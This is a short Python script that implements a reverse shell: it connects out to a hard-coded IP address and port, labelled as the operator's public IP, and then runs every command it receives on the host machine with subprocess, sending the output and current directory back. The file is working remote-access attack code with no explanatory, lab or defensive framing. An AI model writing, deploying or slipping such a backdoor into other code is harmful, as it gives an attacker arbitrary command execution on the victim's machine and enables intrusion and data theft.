import subprocess
import socket
import os

HOST = "37.15.125.211"  # Your public IP
PORT = 10000  # Your open port
client = socket.socket()


def socket_connect():
    try:
        client.connect((HOST, PORT))
    except socket.error:
        exit()


def receive_commands():
    try:
        while True:
            data = client.recv(131072).decode("utf-8", "ignore")

            if data.startswith("cd "):
                os.chdir(data[3:])

            output = subprocess.getoutput(data) + "\n" + os.getcwd()
            client.send(output.encode())

    except socket.error:
        client.close()


if __name__ == '__main__':
    socket_connect()
    receive_commands()
